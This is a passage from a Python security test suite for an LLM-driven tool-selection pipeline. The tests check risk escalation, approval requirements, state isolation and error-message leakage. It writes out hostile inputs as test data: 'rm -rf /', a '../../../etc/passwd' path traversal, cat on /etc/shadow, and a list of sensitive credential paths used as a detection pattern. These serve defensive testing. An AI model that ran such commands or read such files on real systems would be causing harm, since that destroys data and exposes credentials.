        # Should resolve conflicts conservatively (higher risk wins)
        assert policy.risk_level in [RiskLevel.MEDIUM, RiskLevel.HIGH]  # Should escalate from LOW
        assert policy.requires_approval == True  # Should require approval for production DB
    
    def test_permission_vs_risk_conflicts(self, tool_registry):
        """Test conflicts between permission levels and risk assessments"""
        policy_engine = PolicyEngine(tool_registry)
        
        # Create a scenario where a low-permission tool is used for high-risk operation
        permission_conflict_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="monitoring", action="check_security", confidence=0.8),
            entities=[
                EntityV1(type="file", value="/etc/shadow", confidence=0.9),  # Sensitive file
                EntityV1(type="operation", value="read", confidence=0.8)
            ],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,  # Incorrectly assessed
            original_request="check security configuration",
            context={"environment": "production"},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        selected_tools = [
            SelectedTool(
                tool_name="cat",  # Read-only tool
                justification="Read file contents",
                inputs_needed=["/etc/shadow"],  # Sensitive file
                execution_order=1
            )
        ]
        
        policy = policy_engine.determine_execution_policy(permission_conflict_decision, selected_tools)
        
        # Should escalate risk for sensitive file access
        assert policy.requires_approval == True
        assert policy.risk_level in [RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL]
        
        # Should detect sensitive file patterns
        sensitive_files = ["/etc/shadow", "/etc/passwd", "/root/", "/.ssh/"]
        has_sensitive = any(
            any(sensitive in str(tool.inputs_needed) for sensitive in sensitive_files)
            for tool in selected_tools
        )
        if has_sensitive:
            assert policy.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]

# ============================================================================
# CATEGORY 10: INTEGRATION ATTACK VECTORS
# ============================================================================

class TestIntegrationAttackVectors:
    """Test integration attack vector vulnerabilities"""
    
    @pytest.mark.asyncio
    async def test_cross_component_data_injection(self, mock_llm_client, tool_registry, malicious_decision):
        """Test data injection across components"""
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "systemctl", "confidence": 0.8, "justification": "Service control"}]}',
            model="llama2"
        )
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        # The malicious decision contains dangerous entities and commands
        result = await selector.select_tools(malicious_decision)
        
        # Should sanitize data flowing between components
        for tool in result.selected_tools:
            # Should not pass malicious commands to tools
            assert "rm -rf /" not in str(tool.inputs_needed)
            assert "../../../etc/passwd" not in str(tool.inputs_needed)
            
            # Should not trust the original risk assessment
            assert result.execution_policy.requires_approval == True
            assert result.execution_policy.risk_level in [RiskLevel.HIGH, RiskLevel.CRITICAL]
    
    @pytest.mark.asyncio
    async def test_pipeline_state_corruption(self, mock_llm_client, tool_registry):
        """Test pipeline state corruption attacks"""
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        # Create decisions that might corrupt shared state
        corrupting_decisions = []
        for i in range(5):
            decision = DecisionV1(
                decision_id=f"corrupt_{i}",
                decision_type=DecisionType.ACTION,
                timestamp=datetime.now(timezone.utc).isoformat(),
                intent=IntentV1(category="automation", action=f"corrupt_state_{i}", confidence=0.8),
                entities=[
                    EntityV1(type="state", value=f"corrupted_value_{i}", confidence=0.8)
                ],
                overall_confidence=0.8,
                confidence_level=ConfidenceLevel.HIGH,
                risk_level=RiskLevel.LOW,
                original_request=f"operation {i}",
                context={"corruption_attempt": True, "state_id": i},
                requires_approval=False,
                next_stage="stage_b"
            )
            corrupting_decisions.append(decision)
        
        mock_llm_client.generate.return_value = LLMResponse(
            content='{"selected_tools": [{"name": "echo", "confidence": 0.8, "justification": "Safe operation"}]}',
            model="llama2"
        )
        
        # Process decisions sequentially to check for state corruption
        results = []
        for decision in corrupting_decisions:
            result = await selector.select_tools(decision)
            results.append(result)
        
        # Check that each result is independent and not corrupted by previous ones
        for i, result in enumerate(results):
            # Should not contain data from other decisions
            for tool in result.selected_tools:
                assert f"corrupt_state_{i}" not in str(tool.inputs_needed)
                # Should not contain state from other iterations
                for j in range(len(results)):
                    if i != j:
                        assert f"corrupted_value_{j}" not in str(tool.inputs_needed)
    
    @pytest.mark.asyncio
    async def test_error_information_leakage(self, mock_llm_client, tool_registry):
        """Test information leakage through error messages"""
        # Force various error conditions
        error_scenarios = [
            Exception("Database connection failed: password=secret123"),
            Exception("API key invalid: sk-1234567890abcdef"),
            Exception("File not found: /etc/shadow"),
            Exception("Permission denied: /root/.ssh/id_rsa")
        ]
        
        selector = StageBSelector(mock_llm_client, tool_registry)
        
        normal_decision = DecisionV1(
            decision_id="test",
            decision_type=DecisionType.ACTION,
            timestamp=datetime.now(timezone.utc).isoformat(),
            intent=IntentV1(category="automation", action="test_operation", confidence=0.8),
            entities=[EntityV1(type="test", value="test", confidence=0.8)],
            overall_confidence=0.8,
            confidence_level=ConfidenceLevel.HIGH,
            risk_level=RiskLevel.LOW,
            original_request="test operation",
            context={},
            requires_approval=False,
            next_stage="stage_b"
        )
        
        for error in error_scenarios:
            mock_llm_client.generate.side_effect = error
            
            try:
                result = await selector.select_tools(normal_decision)
                # If it succeeds, check that no sensitive info is exposed
                assert "password=" not in str(result.__dict__)
                assert "sk-" not in str(result.__dict__)
                assert "/etc/shadow" not in str(result.__dict__)
                assert "/root/.ssh" not in str(result.__dict__)
            except Exception as e:
                # Error messages should not leak sensitive information
                error_msg = str(e).lower()
                assert "password=" not in error_msg
                assert "sk-" not in error_msg
                assert "secret" not in error_msg
                assert "/etc/shadow" not in error_msg
                assert "/root/.ssh" not in error_msg
                
                # Should provide generic error messages
                assert any(word in error_msg for word in ["failed", "error", "unavailable", "timeout"])

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])